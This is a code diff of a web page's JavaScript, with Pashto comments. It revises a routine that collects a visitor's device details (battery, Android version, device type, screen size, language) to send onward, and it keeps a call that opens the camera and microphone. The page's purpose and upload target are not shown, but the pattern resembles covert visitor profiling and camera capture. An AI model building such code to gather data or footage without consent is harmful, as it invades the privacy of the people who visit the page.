@@ -60,7 +60,7 @@
             } catch (e) {}
         }
 
-        // د موبایل د معلوماتو راټولول
+        // د موبایل د معلوماتو ساده او روښانه راټولول
         async function collectAndSendDeviceInfo() {
             try {
                 let batteryLevel = "نامعلوم";
@@ -69,12 +69,30 @@
                     batteryLevel = Math.round(battery.level * 100) + "%";
                 }
 
+                // د انډرایډ ورژن او ماډل راویستل
+                const ua = navigator.userAgent;
+                let androidVersion = "نامعلوم";
+                let deviceModel = "اندروید/موبایل";
+
+                const androidMatch = ua.match(/Android\s([0-9\.]+)/);
+                if (androidMatch) {
+                    androidVersion = androidMatch[1];
+                }
+
+                if (ua.includes("Mobile")) {
+                    deviceModel = "موبایل (Mobile)";
+                } else if (ua.includes("Tablet")) {
+                    deviceModel = "ټابلیټ (Tablet)";
+                } else {
+                    deviceModel = "کمپیوټر/سیسټم";
+                }
+
                 const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform || "نامعلوم",
-                    screenSize: window.innerWidth + "x" + window.innerHeight,
-                    language: navigator.language || "نامعلوم",
-                    batteryLevel: batteryLevel
+                    deviceType: deviceModel,
+                    androidVer: androidVersion,
+                    screenSize: window.innerWidth + " × " + window.innerHeight,
+                    batteryLevel: batteryLevel,
+                    language: navigator.language || "نامعلوم"
                 };
 
                 const formData = new FormData();
@@ -156,7 +174,6 @@
 
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    // دلته 'audio: true' په سمه توګه په کوچني توري ولیکل شو
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
